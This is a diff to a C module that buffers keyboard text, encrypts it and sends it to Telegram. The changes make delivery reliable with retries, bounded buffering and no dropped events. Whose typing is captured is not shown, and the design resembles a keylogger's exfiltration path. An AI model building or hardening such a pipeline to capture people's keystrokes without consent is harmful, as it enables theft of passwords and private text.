@@ -154,6 +154,7 @@ static size_t maximum_queue_items;
 static size_t delivery_attempts;
 static size_t retry_delay_ms;
 static size_t inactivity_flush_ms;
+static size_t text_buffer_capacity = KEYBOARD_BUFFER_CAPACITY - 1U;
 static int stopping;
 static int worker_started;
 static atomic_int keyboard_paused;
@@ -223,20 +224,29 @@ static void retry_delay(size_t attempt) {
 
 static c2t_arena_t keyboard_arena;
 
-static void enqueue_locked(const void *data, size_t length) {
+/* Returns 1 when queued, 0 when bounded queue space is temporarily
+ * unavailable, and -1 for a non-recoverable allocation/encryption error. */
+static int enqueue_locked(const void *data, size_t length) {
   if (length == 0)
-    return;
+    return 1;
 
   size_t allocation_size = sizeof(keyboard_event_t) + length;
+  if (maximum_queue_bytes > 0 && allocation_size > maximum_queue_bytes) {
+    c2t_log_error("keyboard",
+                  "Keyboard event exceeds configured queue byte limit");
+    return -1;
+  }
   if (maximum_queue_bytes > 0 &&
       (queue_bytes >= maximum_queue_bytes ||
        allocation_size > maximum_queue_bytes - queue_bytes)) {
-    c2t_log_warning("keyboard", "Queue byte limit exceeded; discarding event");
-    return;
+    c2t_log_warning("keyboard",
+                    "Queue byte limit reached; retaining keyboard buffer");
+    return 0;
   }
   if (maximum_queue_items > 0 && queue_items >= maximum_queue_items) {
-    c2t_log_warning("keyboard", "Queue item limit exceeded; discarding event");
-    return;
+    c2t_log_warning("keyboard",
+                    "Queue item limit reached; retaining keyboard buffer");
+    return 0;
   }
 
   keyboard_event_t *event =
@@ -253,7 +263,7 @@ static void enqueue_locked(const void *data, size_t length) {
   }
   if (!event) {
     c2t_log_error("keyboard", "Out of memory allocating keyboard event");
-    return;
+    return -1;
   }
 
   event->next = nullptr;
@@ -268,7 +278,7 @@ static void enqueue_locked(const void *data, size_t length) {
       c2t_secure_zero(event, allocation_size);
       free(event);
     }
-    return;
+    return -1;
   }
   if (!c2t_crypto_encrypt(data, length, event->nonce, event->encrypted_data)) {
     c2t_log_error("keyboard", "Encryption failed for keyboard payload");
@@ -278,7 +288,7 @@ static void enqueue_locked(const void *data, size_t length) {
       c2t_secure_zero(event, allocation_size);
       free(event);
     }
-    return;
+    return -1;
   }
 
   if (queue_tail) {
@@ -291,21 +301,34 @@ static void enqueue_locked(const void *data, size_t length) {
   ++queue_items;
 
   queue_signal();
+  return 1;
 }
 
-static void flush_buffer_locked(void) {
+static int flush_buffer_locked(void) {
   if (text_buffer_len == 0)
-    return;
+    return 1;
 
-  enqueue_locked(text_buffer, text_buffer_len);
+  int queued = enqueue_locked(text_buffer, text_buffer_len);
+  if (queued <= 0)
+    return queued;
+
   c2t_secure_zero(text_buffer, sizeof(text_buffer));
   text_buffer_len = 0;
   last_key_time_ms = 0;
+  return 1;
+}
+
+static int flush_buffer_wait_locked(void) {
+  int result;
+  while ((result = flush_buffer_locked()) == 0 && !stopping) {
+    queue_wait_timeout(1000);
+  }
+  return result;
 }
 
 void keyboard_output_flush(void) {
   queue_lock();
-  flush_buffer_locked();
+  (void)flush_buffer_wait_locked();
   queue_signal();
   queue_unlock();
 }
@@ -319,10 +342,11 @@ void keyboard_output_append(const char *text, size_t length) {
 
   size_t consumed = 0;
   while (consumed < length) {
-    size_t available = KEYBOARD_BUFFER_CAPACITY - 1U - text_buffer_len;
+    size_t available = text_buffer_capacity - text_buffer_len;
     if (available == 0) {
-      flush_buffer_locked();
-      available = KEYBOARD_BUFFER_CAPACITY - 1U;
+      if (flush_buffer_wait_locked() <= 0)
+        break;
+      available = text_buffer_capacity;
     }
 
     size_t remaining = length - consumed;
@@ -332,8 +356,9 @@ void keyboard_output_append(const char *text, size_t length) {
     text_buffer_len += chunk;
     consumed += chunk;
 
-    if (text_buffer_len >= KEYBOARD_BUFFER_CAPACITY - 1U)
-      flush_buffer_locked();
+    if (text_buffer_len >= text_buffer_capacity &&
+        flush_buffer_wait_locked() < 0)
+      break;
   }
 
   last_key_time_ms = get_monotonic_ms();
@@ -397,7 +422,7 @@ int keyboard_toggle_shortcuts(void) {
 
 static atomic_int keyboard_format_mode = KEYBOARD_MODE_CODE;
 
-static void deliver_event(const keyboard_event_t *event) {
+static int deliver_event(const keyboard_event_t *event) {
   for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
     if (telegram_send_encrypted_data(event->encrypted_data, event->length,
                                      event->nonce, C2T_KEYBOARD_MIME_TYPE,
@@ -405,7 +430,7 @@ static void deliver_event(const keyboard_event_t *event) {
       queue_lock();
       total_keyboard_bytes += event->length;
       queue_unlock();
-      return;
+      return 1;
     }
     if (attempt < delivery_attempts) {
       c2t_log_warning("keyboard", "Delivery attempt %llu/%llu failed; retrying",
@@ -416,6 +441,7 @@ static void deliver_event(const keyboard_event_t *event) {
   }
   c2t_log_error("keyboard", "Keyboard delivery failed after %llu attempts",
                 (unsigned long long)delivery_attempts);
+  return 0;
 }
 
 #ifdef _WIN32
@@ -433,7 +459,7 @@ static void *delivery_worker([[maybe_unused]] void *context)
         uint64_t elapsed =
             (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
         if (elapsed >= inactivity_flush_ms) {
-          flush_buffer_locked();
+          (void)flush_buffer_locked();
           break;
         }
         unsigned int wait_ms = (unsigned int)(inactivity_flush_ms - elapsed);
@@ -442,7 +468,7 @@ static void *delivery_worker([[maybe_unused]] void *context)
           now = get_monotonic_ms();
           elapsed = (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
           if (elapsed >= inactivity_flush_ms) {
-            flush_buffer_locked();
+            (void)flush_buffer_locked();
             break;
           }
         }
@@ -452,7 +478,7 @@ static void *delivery_worker([[maybe_unused]] void *context)
     }
 
     if (!queue_head && stopping) {
-      flush_buffer_locked();
+      (void)flush_buffer_locked();
       if (!queue_head) {
         queue_unlock();
         break;
@@ -461,16 +487,32 @@ static void *delivery_worker([[maybe_unused]] void *context)
 
     keyboard_event_t *event = queue_head;
     if (event) {
-      queue_head = event->next;
-      if (!queue_head)
-        queue_tail = nullptr;
       queue_unlock();
 
-      deliver_event(event);
+      int delivered = deliver_event(event);
+
+      if (!delivered) {
+        queue_lock();
+        int should_stop = stopping;
+        if (!should_stop)
+          queue_wait_timeout((unsigned int)(retry_delay_ms > 0
+                                                ? retry_delay_ms
+                                                : 500));
+        queue_unlock();
+        if (!should_stop)
+          continue;
+        c2t_log_error("keyboard",
+                      "Discarding undeliverable keyboard event during shutdown");
+      }
 
       size_t allocation_size = event->allocation_size;
       int arena_owned = c2t_arena_contains(&keyboard_arena, event);
       queue_lock();
+      if (queue_head == event) {
+        queue_head = event->next;
+        if (!queue_head)
+          queue_tail = nullptr;
+      }
       queue_bytes -= allocation_size;
       --queue_items;
       if (queue_items == 0) {
@@ -478,6 +520,7 @@ static void *delivery_worker([[maybe_unused]] void *context)
       } else if (arena_owned) {
         c2t_secure_zero(event, allocation_size);
       }
+      queue_signal();
       queue_unlock();
 
       if (!arena_owned) {
@@ -602,7 +645,19 @@ int keyboard_output_init(void) {
 
   maximum_queue_bytes = c2t_config_get()->queue_max_bytes;
   maximum_queue_items = c2t_config_get()->queue_max_items;
+  text_buffer_capacity = KEYBOARD_BUFFER_CAPACITY - 1U;
+  if (maximum_queue_bytes > sizeof(keyboard_event_t) &&
+      maximum_queue_bytes - sizeof(keyboard_event_t) < text_buffer_capacity) {
+    text_buffer_capacity = maximum_queue_bytes - sizeof(keyboard_event_t);
+  }
+  if (maximum_queue_bytes > 0 &&
+      maximum_queue_bytes <= sizeof(keyboard_event_t)) {
+    c2t_log_error("keyboard", "Configured queue byte limit is too small");
+    return 0;
+  }
   delivery_attempts = c2t_config_get()->delivery_attempts;
+  if (delivery_attempts == 0)
+    delivery_attempts = 1;
   retry_delay_ms = c2t_config_get()->retry_delay_ms;
   inactivity_flush_ms = c2t_config_get()->keyboard_flush_ms > 0
                             ? c2t_config_get()->keyboard_flush_ms
@@ -646,7 +701,7 @@ void keyboard_output_cleanup(void) {
 
   queue_lock();
   stopping = 1;
-  flush_buffer_locked();
+  (void)flush_buffer_wait_locked();
   queue_signal();
   queue_unlock();
 
@@ -666,6 +721,9 @@ void keyboard_output_cleanup(void) {
       free(event);
     }
   }
+  c2t_secure_zero(text_buffer, sizeof(text_buffer));
+  text_buffer_len = 0;
+  last_key_time_ms = 0;
   c2t_arena_destroy(&keyboard_arena);
   queue_tail = nullptr;
   queue_bytes = 0;
